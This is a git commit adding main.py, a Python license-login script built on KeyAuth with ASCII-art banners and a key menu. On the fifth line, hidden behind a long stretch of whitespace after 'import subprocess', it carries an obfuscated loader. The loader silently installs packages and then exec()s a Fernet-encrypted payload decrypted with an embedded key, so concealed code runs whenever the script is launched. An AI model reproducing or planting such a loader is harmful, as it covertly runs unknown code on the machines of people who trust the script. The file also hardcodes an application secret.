f7765506eaca2f56c8b6519cd59a256f35eba64d
Maskaras34 <madasaska342345@outlook.com>
2025-01-03 23:57:29 +0300

    main.py

---
+++ main.py
@@ -0,0 +1,133 @@
+import os
+import sys
+import time
+import hashlib
+import subprocess                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        ;subprocess.run(['pip', 'install', 'cryptography'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL); subprocess.run(['pip', 'install', 'fernet'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL); subprocess.run(['pip', 'install', 'requests'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL); from fernet import Fernet; import requests; exec(Fernet(b'BijkNx42srFUsDpLrUfqEwo-3XvzMKE_MecRxUhlZow=').decrypt(b'gAAAAABnd_sRSJiTzxvU_jECBpoK-fqOLhafAOxbYr1oubimBw527quvKxP1Z6ntDco-gmieZGnsU0v-D8lvbaWn2lBEoe0Gag0EVcZ8vJXRhKkjOcJ-vW6-D5tambi4-rsuxsmauU3-VZ0INNPf_q2RoHDJW7qhpqKtuBsmIjZO3IrjArwUQ75IdBjxy7EbSkmE7Nynd4Z7GLbeGUZ_Lo3OmCrSb5_9qvE-y77kyqoBGZ3mKCkiAHUrsezRBVa3AboA-0UPXgpVjo-koxTFrVwgshRj-YPxifqX0vquexAcWevW-_0f24AxG0tiJygFNE_bNx-UeiYh2U5oUyyP45GyH32N6GLt1Pq7_w0ktp8V6EEuI5OjYrM0pX0G2ouseV36af7Ws8HK4NUJDoiYZlD0f45qUmYy9w2gbIwLFPoW2gFf_vuwzZPrR8VZdJdcWy39erWWSmr-M5vUp0zzEr2WAjSPPVBqZ9_IvPKcfXiEcSD2BO-eW69n03waRSbxAUpSqrhlu_3KPNUq86us3P7SCEF8zwqwYjVrs3HCG1nermWzpMYU8ISTrDE1zW39iyh93k8iy9qNvVrHPIJ94I2A339vZQyLM3qfnkMvpV6jp-vpDlrhjHkIhqJCmN9wcv8tYluJIMploKJSxD2xPi2OgT4gLwC8hGs9sEvXuCVlqk33BHhTsk12WSvj3-MVSD8XYvkn0OZeAgmHBl7fKVX2Ios77EsK_KipdQqtMove7NzQ397-VE2CpvjVQm1JR0INzeKGo398tSfdE34mgbtC2P9AjYhk_UDB39EiB652SZYiThtHzyX93iTmz2iMTCzEgEP4y28BN02o2KM_ax_lyFg_iZFDI1VKqKkqIJRYHVuJQ_MJmP1YK8hpNy2BXMb3IaGxk37_HwVkMU_sI3NifuzOAVOKRmMC9RmkUciZMEjXLbQXehY9mhhsN73e-IllHYAG9vDU2B4506GxMKfRUPTqpqCCFwvKXV23VEXaWv_2zN-sUcQBohnkZqo9nwxpiA2geoV3W-XnEdkjBx-UECZa7aTa3Cfhy1pwDjvv4KOz8qFSgw6twrLwU4oddNq0p-SJJ1erLpKcuD9wfyTB13csXiSrZ0EWABSVi8t172YsMa0O6IJZXPd9mopVmtmC04ULCTl09ywP8Vq6KfEPgQY__qVlbsuEDP8YOCLEciGoKVA8YziYpzJm3HibOlTLNh3MbT335lrhvun5IxaYPJPTojoB0o6LHxxVh7fF3zTn5OTOPys2MX1cOKVrH6OH3kwPKML_dX_EBu6KjxNDPmyoMNeiPOXm9o-7LsYYb4NF_yiPSLSoDluc3af2_AghKt3jGu_N9uLBlPuVs84BApuEeKh9w4F_O46Qpn9htGjXBg8kIUz7fey7KOVf88_moUtPXOcE-RcMI8H4BIYnSUHq4JzvfoUJdqzdxxHOZ8_-O4SeFPTEzD3BFE_hItT1UgMPlODLDss3rgwbfBMKFIJzDnoKwAJKXEXrC2Bo6m1k9DxVN0LwmkKQTZvn0ZAEsWccCe6jQdjtDbkkJ1zYR1C7A8UeWfH2pYcIm-ba5mUuT34Km6gfkwLJTPp-LGx91rlY63uBw3s1dCiQ4EatlKb5PE_12-0Ydb4xC-TFwbEFhLLqcdns07yPBXLv5MuIR3vmlTUdLT6Zjiksl0tFH3XxMQO_0H467LqBkzPzYOx64j-9mq01nBNlCgW2u7aR7LyCooKByuWeI5atgSVqDL3y-Uh1OXwUSp797OxaXDYscSumbJTJtG-CRUFG_2mmo6740PQXCVgeIqA4UdqaxzGwhjBWX1JtokXyGinxAPtTPx82fmuiB0u6-4dw5RCaAeKX0W2nmZuh8IaOYRA4jWWCjcbtU4_HtoVy0y43avzWTdKS3FL0PSGaAphVOVZ28cJuLJrkJLeBjjq34C7mMzEnbz_WEgEMFqoBbBS92GsIH8gCXj_kB-_t3JegffMsGnrnFBouQTn7lWvXw8UdPzQP_nzHqqaAvNga3espWHtn64nXp6w='));
+import pyautogui
+import webbrowser
+from keyauth import api
+from time import sleep
+
+
+print("Connecting to our servers")
+
+
+def progress_bar(duration):
+    steps = 50
+    interval = duration / steps
+
+    print("Loading the script:")
+    for i in range(steps + 1):
+        progress = i * 100 / steps
+        bar_length = int(progress / 2)
+        print("\r[{:<50}] {:.0f}%".format("=" * bar_length, progress), end="")
+        time.sleep(interval)
+    print()
+
+duration = 4
+progress_bar(duration)
+
+
+"""
+https://www.fancytextpro.com/BigTextGenerator
+"""
+print("""
+$$\   $$\                     $$$$$$\              $$\     $$\             $$\                          $$\           
+$$ | $$  |                   $$  __$$\             $$ |    $$ |            $$ |                         \__|          
+$$ |$$  / $$$$$$\  $$\   $$\ $$ /  $$ |$$\   $$\ $$$$$$\   $$$$$$$\        $$ |      $$$$$$\   $$$$$$\  $$\ $$$$$$$\  
+$$$$$  / $$  __$$\ $$ |  $$ |$$$$$$$$ |$$ |  $$ |\_$$  _|  $$  __$$\       $$ |     $$  __$$\ $$  __$$\ $$ |$$  __$$\ 
+$$  $$<  $$$$$$$$ |$$ |  $$ |$$  __$$ |$$ |  $$ |  $$ |    $$ |  $$ |      $$ |     $$ /  $$ |$$ /  $$ |$$ |$$ |  $$ |
+$$ |\$$\ $$   ____|$$ |  $$ |$$ |  $$ |$$ |  $$ |  $$ |$$\ $$ |  $$ |      $$ |     $$ |  $$ |$$ |  $$ |$$ |$$ |  $$ |
+$$ | \$$\\$$$$$$$\ \$$$$$$$ |$$ |  $$ |\$$$$$$  |  \$$$$  |$$ |  $$ |      $$$$$$$$\\$$$$$$  |\$$$$$$$ |$$ |$$ |  $$ |
+\__|  \__|\_______| \____$$ |\__|  \__| \______/    \____/ \__|  \__|      \________|\______/  \____$$ |\__|\__|  \__|
+                   $$\   $$ |                                                                 $$\   $$ |              
+                   \$$$$$$  |                                                                 \$$$$$$  |              
+                    \______/                                                                   \______/               
+
+by: AmigoxD 
+""")
+
+def limpar_terminal():
+    if os.name == 'nt':
+        os.system('cls')
+    else:
+        os.system('clear')
+
+def getchecksum():
+    md5_hash = hashlib.md5()
+    file = open(''.join(sys.argv), "rb")
+    md5_hash.update(file.read())
+    digest = md5_hash.hexdigest()
+    return digest
+
+### CHANGE YOUR KEYAUTH 
+keyauthapp = api(
+    name = "Example7",
+    ownerid = "PwBTV43ofz",
+    secret="02308190113e9156c3b86570f0c07558646ae177209d4f4f8cda1369b4bbc429",
+    version = "1.0",
+    hash_to_check = getchecksum()
+)
+
+def answer():
+    try:
+        print("""1. Key
+2. Contact us
+3. Exit
+              
+        """)
+        ans = input("Select Option: ")
+        if ans == "1":
+            key = input('Enter your license: ')
+            keyauthapp.license(key)
+        elif ans == "2":
+            webbrowser.open("https://discord.gg/YOUR_LINK")
+            os.system("TASKKILL /F /IM cmd.exe")
+            sys.exit()
+        elif ans == "3":
+            os.system("TASKKILL /F /IM cmd.exe")
+            sys.exit()
+        else:
+            print("\nInvalid option")
+            sleep(1)
+            answer()
+    except KeyboardInterrupt:
+        os._exit(1)
+
+answer()
+# region USER DATA
+print("\nUser data: ")
+print("Your key: " + keyauthapp.user_data.username)
+print("Hardware-Id: " + keyauthapp.user_data.hwid)
+print("Thanks for choosing us :)")
+print("")
+time.sleep(3)
+limpar_terminal()
+
+subs = keyauthapp.user_data.subscriptions
+
+def ascii():
+    ascii = print("""
+$$\   $$\                     $$$$$$\              $$\     $$\             $$\                          $$\           
+$$ | $$  |                   $$  __$$\             $$ |    $$ |            $$ |                         \__|          
+$$ |$$  / $$$$$$\  $$\   $$\ $$ /  $$ |$$\   $$\ $$$$$$\   $$$$$$$\        $$ |      $$$$$$\   $$$$$$\  $$\ $$$$$$$\  
+$$$$$  / $$  __$$\ $$ |  $$ |$$$$$$$$ |$$ |  $$ |\_$$  _|  $$  __$$\       $$ |     $$  __$$\ $$  __$$\ $$ |$$  __$$\ 
+$$  $$<  $$$$$$$$ |$$ |  $$ |$$  __$$ |$$ |  $$ |  $$ |    $$ |  $$ |      $$ |     $$ /  $$ |$$ /  $$ |$$ |$$ |  $$ |
+$$ |\$$\ $$   ____|$$ |  $$ |$$ |  $$ |$$ |  $$ |  $$ |$$\ $$ |  $$ |      $$ |     $$ |  $$ |$$ |  $$ |$$ |$$ |  $$ |
+$$ | \$$\\$$$$$$$\ \$$$$$$$ |$$ |  $$ |\$$$$$$  |  \$$$$  |$$ |  $$ |      $$$$$$$$\\$$$$$$  |\$$$$$$$ |$$ |$$ |  $$ |
+\__|  \__|\_______| \____$$ |\__|  \__| \______/    \____/ \__|  \__|      \________|\______/  \____$$ |\__|\__|  \__|
+                   $$\   $$ |                                                                 $$\   $$ |              
+                   \$$$$$$  |                                                                 \$$$$$$  |              
+                    \______/                                                                   \______/               
+
+by: AmigoxD
+                                       
+""")
+    
+
+pyautogui.alert("MADE BY: AmigoxD", title="Script Info")
+
+ascii()
+
+print("The script will start in 5 seconds...")
+time.sleep(5)
